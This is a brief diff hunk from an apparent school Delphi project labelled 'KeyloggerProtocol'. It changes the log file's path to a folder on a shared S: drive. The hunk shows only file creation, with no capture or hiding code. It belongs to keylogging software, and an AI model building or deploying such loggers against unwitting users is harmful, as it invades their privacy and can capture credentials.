@@ -49,7 +49,7 @@ end;
 procedure TForm1.FormCreate(Sender: TObject); //Writes Lines to .txt
 var f:textfile;
 begin
-d:= datetostr(now) + '.txt';
+d:= 'S:\Informatik EF 2015\lökj\' +  datetostr(now) + '.txt';
 assignfile(f,d);
 rewrite(f);
 writeln(f, 'KeyloggerProtocol - EF Info');
